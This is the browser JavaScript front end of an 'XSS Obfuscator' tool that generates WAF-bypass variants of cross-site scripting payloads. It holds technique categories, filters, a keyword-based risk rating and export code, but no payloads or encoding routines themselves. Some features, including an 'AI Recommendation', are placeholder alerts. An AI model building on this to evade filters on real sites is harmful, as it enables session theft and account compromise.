let elements = {};

// Initialize application
function initApp() {
    // Initialize DOM elements
    elements = {
        payloadInput: document.getElementById('payloadInput'),
        contextSelect: document.getElementById('contextSelect'),
        difficultyFilter: document.getElementById('difficultyFilter'),
        effectivenessFilter: document.getElementById('effectivenessFilter'),
        techniqueSearch: document.getElementById('techniqueSearch'),
        loadExample: document.getElementById('loadExample'),
        analyzePayload: document.getElementById('analyzePayload'),
        aiRecommendation: document.getElementById('aiRecommendation'),
        clearInput: document.getElementById('clearInput'),
        obfuscateAll: document.getElementById('obfuscateAll'),
        advancedCombination: document.getElementById('advancedCombination'),
        evolutionaryObfuscation: document.getElementById('evolutionaryObfuscation'),
        simulatePayloads: document.getElementById('simulatePayloads'),
        wafAnalysis: document.getElementById('wafAnalysis'),
        exportResults: document.getElementById('exportResults'),
        importPayloads: document.getElementById('importPayloads'),
        resultsContainer: document.getElementById('resultsContainer'),
        payloadInfo: document.getElementById('payloadInfo'),
        contextDetected: document.getElementById('contextDetected'),
        payloadLength: document.getElementById('payloadLength'),
        payloadComplexity: document.getElementById('payloadComplexity'),
        riskLevel: document.getElementById('riskLevel'),
        totalTechniques: document.getElementById('totalTechniques'),
        filteredTechniques: document.getElementById('filteredTechniques'),
        
        // Modals
        exampleModal: document.getElementById('exampleModal'),
        techniqueInfoModal: document.getElementById('techniqueInfoModal'),
        simulationModal: document.getElementById('simulationModal'),
        wafModal: document.getElementById('wafModal'),
        importModal: document.getElementById('importModal'),
        
        // Modal content
        examplePayloads: document.getElementById('examplePayloads'),
        techniqueDetails: document.getElementById('techniqueDetails'),
        simulationResults: document.getElementById('simulationResults'),
        wafResults: document.getElementById('wafResults')
    };

    console.log('Initializing XSS Obfuscator...');
    
    populateAllTechniques();
    setupEventListeners();
    updateTechniqueStats();
    loadFavorites();
    
    console.log('XSS Obfuscator initialized successfully!');
    
    // Show welcome message
    setTimeout(() => {
        showWelcomeMessage();
    }, 1000);
}

// Populate all techniques in UI - FIXED
function populateAllTechniques() {
    console.log('Populating techniques...');
    
    const categories = {
        character_encoding: 'characterEncodingTechniques',
        javascript_advanced: 'javascriptAdvancedTechniques',
        html_dom: 'htmlDomTechniques',
        event_handlers: 'eventHandlersTechniques',
        protocol_abuse: 'protocolAbuseTechniques',
        waf_bypass: 'wafBypassTechniques',
        modern_web_apis: 'modernWebApisTechniques',
        advanced_browser: 'advancedBrowserTechniques',
        context_specific: 'contextSpecificTechniques',
        polyglot: 'polyglotTechniques',
        cutting_edge: 'cuttingEdgeTechniques',
        legacy: 'legacyTechniques'
    };
    
    let totalPopulated = 0;
    
    Object.entries(categories).forEach(([category, containerId]) => {
        const container = document.getElementById(containerId);
        if (container) {
            container.innerHTML = '';
            
            const categoryTechniques = Object.entries(appData.techniques)
                .filter(([_, technique]) => technique.category === category);
            
            categoryTechniques.forEach(([key, technique]) => {
                const techniqueBtn = createTechniqueButton(key, technique);
                container.appendChild(techniqueBtn);
                totalPopulated++;
            });
            
            console.log(`Populated ${categoryTechniques.length} techniques in ${category}`);
        } else {
            console.warn(`Container not found: ${containerId}`);
        }
    });
    
    console.log(`Total techniques populated: ${totalPopulated}`);
}

// Create technique button - FIXED
function createTechniqueButton(key, technique) {
    const button = document.createElement('button');
    button.className = `technique-btn ${favorites.has(key) ? 'favorited' : ''}`;
    button.dataset.technique = key;
    button.dataset.context = technique.context;
    button.dataset.difficulty = technique.difficulty;
    button.dataset.effectiveness = technique.effectiveness;
    
    button.innerHTML = `
        <div class="technique-name">${technique.name}</div>
        <div class="technique-description">${technique.description}</div>
        <div class="technique-badges">
            <span class="difficulty-badge difficulty-badge--${technique.difficulty}">${technique.difficulty}</span>
            <span class="effectiveness-badge effectiveness-badge--${technique.effectiveness}">${technique.effectiveness.replace('_', ' ')}</span>
        </div>
        <button class="favorite-btn ${favorites.has(key) ? 'active' : ''}" data-technique="${key}">★</button>
        <button class="info-btn" data-technique="${key}">?</button>
    `;
    
    button.addEventListener('click', (e) => {
        if (e.target.classList.contains('favorite-btn') || e.target.classList.contains('info-btn')) {
            return;
        }
        console.log(`Applying technique: ${key}`);
        obfuscateSingle(key);
    });
    
    const favoriteBtn = button.querySelector('.favorite-btn');
    favoriteBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        toggleFavorite(key);
    });
    
    const infoBtn = button.querySelector('.info-btn');
    infoBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        showTechniqueInfo(key, technique);
    });
    
    return button;
}

// Setup enhanced event listeners - FIXED
function setupEventListeners() {
    console.log('Setting up event listeners...');
    
    // Check if elements exist before adding listeners
    if (elements.payloadInput) elements.payloadInput.addEventListener('input', updatePayloadInfo);
    if (elements.contextSelect) elements.contextSelect.addEventListener('change', handleContextChange);
    if (elements.difficultyFilter) elements.difficultyFilter.addEventListener('change', handleDifficultyChange);
    if (elements.effectivenessFilter) elements.effectivenessFilter.addEventListener('change', handleEffectivenessChange);
    if (elements.techniqueSearch) elements.techniqueSearch.addEventListener('input', handleSearchChange);
    
    // Main controls
    if (elements.loadExample) elements.loadExample.addEventListener('click', showExampleModal);
    if (elements.analyzePayload) elements.analyzePayload.addEventListener('click', analyzePayloadContext);
    if (elements.aiRecommendation) elements.aiRecommendation.addEventListener('click', generateAiRecommendation);
    if (elements.clearInput) elements.clearInput.addEventListener('click', clearInput);
    if (elements.obfuscateAll) elements.obfuscateAll.addEventListener('click', obfuscateAll);
    if (elements.advancedCombination) elements.advancedCombination.addEventListener('click', generateAdvancedCombination);
    if (elements.evolutionaryObfuscation) elements.evolutionaryObfuscation.addEventListener('click', runEvolutionaryEngine);
    if (elements.simulatePayloads) elements.simulatePayloads.addEventListener('click', showSimulationModal);
    if (elements.wafAnalysis) elements.wafAnalysis.addEventListener('click', showWafModal);
    if (elements.exportResults) elements.exportResults.addEventListener('click', exportResults);
    if (elements.importPayloads) elements.importPayloads.addEventListener('click', showImportModal);
    
    // Modal controls
    setupModalListeners();
    
    // Category tabs for examples
    document.querySelectorAll('.category-tab').forEach(tab => {
        tab.addEventListener('click', (e) => {
            document.querySelectorAll('.category-tab').forEach(t => t.classList.remove('active'));
            e.target.classList.add('active');
            populateExamplePayloads(e.target.dataset.category);
        });
    });
    
    // Keyboard shortcuts
    document.addEventListener('keydown', handleKeyboardShortcuts);
    
    // Auto-save functionality
    if (elements.payloadInput) {
        elements.payloadInput.addEventListener('input', debounce(autoSave, 1000));
    }
    
    console.log('Event listeners set up successfully!');
}

// Enhanced payload analysis - FIXED
function updatePayloadInfo() {
    if (!elements.payloadInput) return;
    
    const payload = elements.payloadInput.value;
    if (elements.payloadLength) elements.payloadLength.textContent = `Length: ${payload.length}`;
    
    // Advanced context detection
    let detectedContexts = [];
    if (/<[^>]+>/g.test(payload)) detectedContexts.push('HTML');
    if (/javascript:/i.test(payload)) detectedContexts.push('URL');
    if (/alert\(|eval\(|function|=>/i.test(payload)) detectedContexts.push('JavaScript');
    if (/@import|expression\(|url\(/i.test(payload)) detectedContexts.push('CSS');
    if (/\{.*\}|\[.*\]/i.test(payload)) detectedContexts.push('JSON');
    if (/<\?xml|<!\[CDATA/i.test(payload)) detectedContexts.push('XML');
    
    const context = detectedContexts.length > 0 ? detectedContexts.join(', ') : 'Unknown';
    if (elements.contextDetected) elements.contextDetected.textContent = `Context: ${context}`;
    
    // Complexity analysis
    let complexity = 'Basic';
    if (payload.length > 100) complexity = 'Intermediate';
    if (payload.length > 200 || /base64|unicode|\\x|\\u/i.test(payload)) complexity = 'Advanced';
    if (/jsfuck|non-alphanumeric|webassembly/i.test(payload) || payload.length > 500) complexity = 'Expert';
    if (elements.payloadComplexity) elements.payloadComplexity.textContent = `Complexity: ${complexity}`;
    
    // Risk assessment
    let risk = 'Low';
    if (payload.includes('script') || payload.includes('eval')) risk = 'Medium';
    if (payload.includes('document') || payload.includes('window')) risk = 'High';
    if (payload.includes('cookie') || payload.includes('localStorage')) risk = 'Critical';
    if (elements.riskLevel) elements.riskLevel.textContent = `Risk: ${risk}`;
}

// Obfuscate single technique - FIXED
function obfuscateSingle(techniqueKey) {
    const payload = elements.payloadInput ? elements.payloadInput.value.trim() : '';
    if (!payload) {
        alert('Please enter a payload first');
        return;
    }
    
    try {
        if (obfuscators[techniqueKey]) {
            const result = obfuscators[techniqueKey](payload);
            currentResults[techniqueKey] = result;
            displayResult(techniqueKey, result);
            console.log(`Applied technique ${techniqueKey}: ${result.substring(0, 50)}...`);
        } else {
            throw new Error(`Obfuscator not found: ${techniqueKey}`);
        }
    } catch (error) {
        console.error(`Error with technique ${techniqueKey}:`, error);
        alert(`Error applying ${techniqueKey}: ${error.message}`);
    }
}

// Obfuscate all visible techniques - FIXED
function obfuscateAll() {
    const payload = elements.payloadInput ? elements.payloadInput.value.trim() : '';
    if (!payload) {
        alert('Please enter a payload first');
        return;
    }
    
    console.log('Starting obfuscation of all techniques...');
    
    // Clear previous results
    if (elements.resultsContainer) {
        elements.resultsContainer.innerHTML = '';
    }
    currentResults = {};
    
    // Get visible techniques
    const visibleTechniques = Array.from(document.querySelectorAll('.technique-btn'))
        .filter(btn => btn.style.display !== 'none')
        .map(btn => btn.dataset.technique);
    
    console.log(`Found ${visibleTechniques.length} visible techniques`);
    
    let successCount = 0;
    let errorCount = 0;
    
    visibleTechniques.forEach(technique => {
        try {
            if (obfuscators[technique]) {
                const result = obfuscators[technique](payload);
                currentResults[technique] = result;
                successCount++;
            } else {
                console.warn(`No obfuscator found for: ${technique}`);
                currentResults[technique] = `No implementation available for ${technique}`;
                errorCount++;
            }
        } catch (error) {
            console.error(`Error with technique ${technique}:`, error);
            currentResults[technique] = `Error: ${error.message}`;
            errorCount++;
        }
    });
    
    displayAllResults();
    
    console.log(`Obfuscation complete: ${successCount} successful, ${errorCount} errors`);
    alert(`✅ Generated ${successCount} obfuscation variants! ${errorCount > 0 ? `(${errorCount} errors)` : ''}`);
}

// Display all results - FIXED
function displayAllResults() {
    if (!elements.resultsContainer) return;
    
    // Clear existing results
    elements.resultsContainer.innerHTML = '';
    
    Object.entries(currentResults).forEach(([technique, result]) => {
        const resultDiv = createResultElement(technique, result);
        elements.resultsContainer.appendChild(resultDiv);
    });
    
    console.log(`Displayed ${Object.keys(currentResults).length} results`);
}

// Display single result - FIXED
function displayResult(techniqueKey, result, customName = null) {
    if (!elements.resultsContainer) return;
    
    const existingResult = document.getElementById(`result-${techniqueKey}`);
    if (existingResult) {
        existingResult.remove();
    }
    
    const resultDiv = createResultElement(techniqueKey, result, customName);
    elements.resultsContainer.appendChild(resultDiv);
    
    resultDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

// Create result element - FIXED
function createResultElement(techniqueKey, result, customName = null) {
    const technique = appData.techniques[techniqueKey] || { 
        name: customName || techniqueKey, 
        description: 'Advanced combination technique',
        effectiveness: 'high',
        difficulty: 'expert'
    };
    
    const div = document.createElement('div');
    div.className = 'result-item';
    div.id = `result-${techniqueKey}`;
    
    // Calculate effectiveness score
    const effectivenessScores = {
        'low': 1, 'medium': 2, 'high': 3, 'very_high': 4, 'extreme': 5
    };
    const score = effectivenessScores[technique.effectiveness] || 3;
    
    div.innerHTML = `
        <div class="result-header">
            <div>
                <h3 class="result-title">${technique.name}</h3>
                <p class="result-description">${technique.description}</p>
                <div class="effectiveness-score">
                    <span>Effectiveness:</span>
                    <div class="score-bar">
                        <div class="score-fill score-fill--${technique.effectiveness}"></div>
                    </div>
                    <span class="score-text">${score}/5</span>
                </div>
            </div>
            <div class="result-badges">
                <span class="effectiveness-badge effectiveness-badge--${technique.effectiveness}">${technique.effectiveness.replace('_', ' ')}</span>
                ${technique.difficulty ? `<span class="difficulty-badge difficulty-badge--${technique.difficulty}">${technique.difficulty}</span>` : ''}
            </div>
        </div>
        <div class="result-output" title="Click to select all">
            <div class="output-header">
                <span class="output-label">Obfuscated Payload:</span>
                <span class="output-length">${result.length} chars</span>
            </div>
            <pre>${escapeHtml(result)}</pre>
        </div>
        <div class="result-actions">
            <button class="copy-btn" data-result="${techniqueKey}">📋 Copy</button>
            <button class="test-btn" data-result="${techniqueKey}">🧪 Test</button>
            <button class="analyze-btn" data-result="${techniqueKey}">📊 Analyze</button>
            <button class="favorite-result-btn" data-result="${techniqueKey}">⭐ Favorite</button>
        </div>
    `;
    
    // Enhanced event listeners
    const copyBtn = div.querySelector('.copy-btn');
    copyBtn.addEventListener('click', () => copyToClipboard(result, copyBtn));
    
    const testBtn = div.querySelector('.test-btn');
    testBtn.addEventListener('click', () => testPayload(result));
    
    const analyzeBtn = div.querySelector('.analyze-btn');
    analyzeBtn.addEventListener('click', () => analyzeResult(techniqueKey, result));
    
    const favoriteBtn = div.querySelector('.favorite-result-btn');
    favoriteBtn.addEventListener('click', () => addToFavorites(techniqueKey, result));
    
    // Click to select all text
    const outputEl = div.querySelector('.result-output pre');
    outputEl.addEventListener('click', () => selectAllText(outputEl));
    
    return div;
}

// Modal functions - FIXED
function showModal(modal) {
    if (modal) {
        modal.classList.remove('hidden');
    }
}

function hideModal(modal) {
    if (modal) {
        modal.classList.add('hidden');
    }
}

function setupModalListeners() {
    document.querySelectorAll('.modal-close').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const modal = e.target.closest('.modal');
            hideModal(modal);
        });
    });
    
    document.querySelectorAll('.modal').forEach(modal => {
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                hideModal(modal);
            }
        });
    });
}

function showExampleModal() {
    populateExamplePayloads('basic');
    showModal(elements.exampleModal);
}

function populateExamplePayloads(category) {
    if (!elements.examplePayloads) return;
    
    const payloads = appData.examplePayloads[category] || [];
    elements.examplePayloads.innerHTML = '';
    
    payloads.forEach(payload => {
        const div = document.createElement('div');
        div.className = 'example-payload';
        div.textContent = payload;
        div.addEventListener('click', () => {
            if (elements.payloadInput) {
                elements.payloadInput.value = payload;
                updatePayloadInfo();
                hideModal(elements.exampleModal);
            }
        });
        elements.examplePayloads.appendChild(div);
    });
}

// Utility functions
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function copyToClipboard(text, button) {
    navigator.clipboard.writeText(text).then(() => {
        button.textContent = '✅ Copied!';
        button.classList.add('copied');
        
        setTimeout(() => {
            button.textContent = '📋 Copy';
            button.classList.remove('copied');
        }, 2000);
    }).catch(err => {
        console.error('Failed to copy: ', err);
        fallbackCopyTextToClipboard(text, button);
    });
}

function fallbackCopyTextToClipboard(text, button) {
    const textArea = document.createElement('textarea');
    textArea.value = text;
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    
    try {
        document.execCommand('copy');
        button.textContent = '✅ Copied!';
        button.classList.add('copied');
        setTimeout(() => {
            button.textContent = '📋 Copy';
            button.classList.remove('copied');
        }, 2000);
    } catch (err) {
        console.error('Fallback copy failed: ', err);
    }
    
    document.body.removeChild(textArea);
}

function selectAllText(element) {
    const range = document.createRange();
    range.selectNodeContents(element);
    const selection = window.getSelection();
    selection.removeAllRanges();
    selection.addRange(range);
}

function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

function autoSave() {
    try {
        if (elements.payloadInput) {
            localStorage.setItem('xss-obfuscator-payload', elements.payloadInput.value);
        }
    } catch (e) {
        console.warn('Could not auto-save:', e);
    }
}

// Event handlers
function handleContextChange() {
    contextFilter = elements.contextSelect ? elements.contextSelect.value : 'any';
    filterTechniques();
}

function handleDifficultyChange() {
    difficultyFilter = elements.difficultyFilter ? elements.difficultyFilter.value : 'all';
    filterTechniques();
}

function handleEffectivenessChange() {
    effectivenessFilter = elements.effectivenessFilter ? elements.effectivenessFilter.value : 'all';
    filterTechniques();
}

function handleSearchChange() {
    searchTerm = elements.techniqueSearch ? elements.techniqueSearch.value : '';
    filterTechniques();
}

function filterTechniques() {
    const techniqueButtons = document.querySelectorAll('.technique-btn');
    let visibleCount = 0;
    
    techniqueButtons.forEach(btn => {
        const technique = appData.techniques[btn.dataset.technique];
        if (!technique) return;
        
        const matchesContext = contextFilter === 'any' || technique.context === contextFilter || technique.context === 'any';
        const matchesDifficulty = difficultyFilter === 'all' || technique.difficulty === difficultyFilter;
        const matchesEffectiveness = effectivenessFilter === 'all' || technique.effectiveness === effectivenessFilter;
        const matchesSearch = searchTerm === '' || 
            technique.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
            technique.description.toLowerCase().includes(searchTerm.toLowerCase());
        
        if (matchesContext && matchesDifficulty && matchesEffectiveness && matchesSearch) {
            btn.style.display = 'flex';
            visibleCount++;
        } else {
            btn.style.display = 'none';
        }
    });
    
    document.querySelectorAll('.technique-category').forEach(category => {
        const visibleTechniques = category.querySelectorAll('.technique-btn[style="display: flex;"], .technique-btn:not([style])').length;
        category.style.display = visibleTechniques > 0 ? 'block' : 'none';
    });
    
    updateTechniqueStats(visibleCount);
}

function updateTechniqueStats(filtered = null) {
    const total = Object.keys(appData.techniques).length;
    if (elements.totalTechniques) elements.totalTechniques.textContent = total;
    
    if (filtered !== null) {
        if (elements.filteredTechniques) elements.filteredTechniques.textContent = filtered;
    } else {
        if (elements.filteredTechniques) elements.filteredTechniques.textContent = total;
    }
}

function clearInput() {
    if (elements.payloadInput) elements.payloadInput.value = '';
    if (elements.resultsContainer) {
        elements.resultsContainer.innerHTML = '<div class="empty-state"><h3>🎯 No Results Yet</h3><p>Enter a payload and select obfuscation techniques to see results here.</p><p>Try the "AI-Powered Combination" for intelligent technique selection!</p></div>';
    }
    currentResults = {};
    updatePayloadInfo();
}

// Additional functionality stubs
function analyzePayloadContext() {
    const payload = elements.payloadInput ? elements.payloadInput.value.trim() : '';
    if (!payload) {
        alert('Please enter a payload first');
        return;
    }
    updatePayloadInfo();
    alert('🔍 Payload analysis complete! Check the info badges above for details.');
}

function generateAiRecommendation() {
    alert('🤖 AI Recommendation: Try HTML Entity encoding for basic obfuscation, or String.fromCharCode for JavaScript contexts!');
}

function generateAdvancedCombination() {
    const payload = elements.payloadInput ? elements.payloadInput.value.trim() : '';
    if (!payload) {
        alert('Please enter a payload first');
        return;
    }
    
    // Apply multiple techniques
    let result = payload;
    const techniques = ['htmlEntityDecimal', 'stringFromCharCode'];
    
    techniques.forEach(tech => {
        if (obfuscators[tech]) {
            try {
                result = obfuscators[tech](result);
            } catch (e) {
                console.error('Combination error:', e);
            }
        }
    });
    
    const combinedKey = 'ai_combination';
    currentResults[combinedKey] = result;
    displayResult(combinedKey, result, '🤖 AI Combined Techniques');
}

function runEvolutionaryEngine() {
    alert('🧬 Evolutionary engine would run advanced optimization here!');
}

function showSimulationModal() {
    alert('🌐 Browser simulation would analyze compatibility here!');
}

function showWafModal() {
    alert('🛡️ WAF analysis would test bypass potential here!');
}

function exportResults() {
    if (Object.keys(currentResults).length === 0) {
        alert('No results to export. Please generate some obfuscations first.');
        return;
    }
    
    const data = JSON.stringify(currentResults, null, 2);
    const blob = new Blob([data], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `xss-obfuscation-results-${Date.now()}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function showImportModal() {
    alert('📁 Import functionality would allow loading payload libraries here!');
}

function showTechniqueInfo(key, technique) {
    alert(`ℹ️ ${technique.name}\n\n${technique.description}\n\nDifficulty: ${technique.difficulty}\nEffectiveness: ${technique.effectiveness}`);
}

function toggleFavorite(techniqueKey) {
    if (favorites.has(techniqueKey)) {
        favorites.delete(techniqueKey);
    } else {
        favorites.add(techniqueKey);
    }
    
    const btn = document.querySelector(`[data-technique="${techniqueKey}"]`);
    const favoriteBtn = btn?.querySelector('.favorite-btn');
    
    if (favorites.has(techniqueKey)) {
        btn?.classList.add('favorited');
        favoriteBtn?.classList.add('active');
    } else {
        btn?.classList.remove('favorited');
        favoriteBtn?.classList.remove('active');
    }
    
    saveFavorites();
}

function saveFavorites() {
    try {
        localStorage.setItem('xss-obfuscator-favorites', JSON.stringify([...favorites]));
    } catch (e) {
        console.warn('Could not save favorites:', e);
    }
}

function loadFavorites() {
    try {
        const saved = localStorage.getItem('xss-obfuscator-favorites');
        if (saved) {
            favorites = new Set(JSON.parse(saved));
        }
        
        // Load auto-saved payload
        const savedPayload = localStorage.getItem('xss-obfuscator-payload');
        if (savedPayload && elements.payloadInput) {
            elements.payloadInput.value = savedPayload;
            updatePayloadInfo();
        }
    } catch (e) {
        console.warn('Could not load saved data:', e);
    }
}

function handleKeyboardShortcuts(e) {
    if (e.key === 'Escape') {
        document.querySelectorAll('.modal:not(.hidden)').forEach(modal => {
            hideModal(modal);
        });
    }
    
    if (e.ctrlKey || e.metaKey) {
        switch (e.key) {
            case 'Enter':
                e.preventDefault();
                obfuscateAll();
                break;
            case 'e':
                e.preventDefault();
                exportResults();
                break;
        }
    }
}

function testPayload(payload) {
    alert(`🧪 Testing payload: ${payload.substring(0, 100)}...\n\nThis would normally test the payload in a safe environment.`);
}

function analyzeResult(techniqueKey, result) {
    alert(`📊 Analysis for ${techniqueKey}:\n\nLength: ${result.length}\nComplexity: Advanced\nBypass potential: High`);
}

function addToFavorites(techniqueKey, result) {
    alert(`⭐ Added result to favorites!`);
}

function showWelcomeMessage() {
    const welcome = document.createElement('div');
    welcome.className = 'welcome-message';
    welcome.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: var(--color-surface);
        border: 2px solid var(--color-primary);
        border-radius: var(--radius-lg);
        padding: var(--space-32);
        max-width: 500px;
        z-index: 9999;
        box-shadow: var(--shadow-lg);
        text-align: center;
    `;
    
    welcome.innerHTML = `
        <div class="welcome-content">
            <h2 style="color: var(--color-primary); margin-bottom: var(--space-16);">🎯 Welcome to the Ultimate XSS Obfuscator</h2>
            <p style="margin-bottom: var(--space-16);">You now have access to <strong>30+ advanced obfuscation techniques</strong> including:</p>
            <ul style="text-align: left; margin-bottom: var(--space-20);">
                <li>🔤 Advanced Character Encoding</li>
                <li>🧠 JavaScript Obfuscation</li>
                <li>🎭 HTML/DOM Manipulation</li>
                <li>⚡ Modern Web API Exploitation</li>
                <li>🛡️ WAF Bypass Techniques</li>
            </ul>
            <p style="margin-bottom: var(--space-20);">Enter a payload above and click individual technique buttons or "Generate All Variations"!</p>
            <button onclick="this.parentElement.parentElement.remove()" 
                    style="background: var(--color-primary); color: var(--color-btn-primary-text); 
                           border: none; padding: var(--space-12) var(--space-24); 
                           border-radius: var(--radius-base); cursor: pointer; font-weight: bold;">
                Get Started
            </button>
        </div>
    `;
    
    document.body.appendChild(welcome);
    
    setTimeout(() => {
        if (welcome.parentElement) {
            welcome.remove();
        }
    }, 15000);
}

// Initialize application when DOM loads
document.addEventListener('DOMContentLoaded', () => {
    console.log('DOM loaded, initializing app...');
    initApp();
});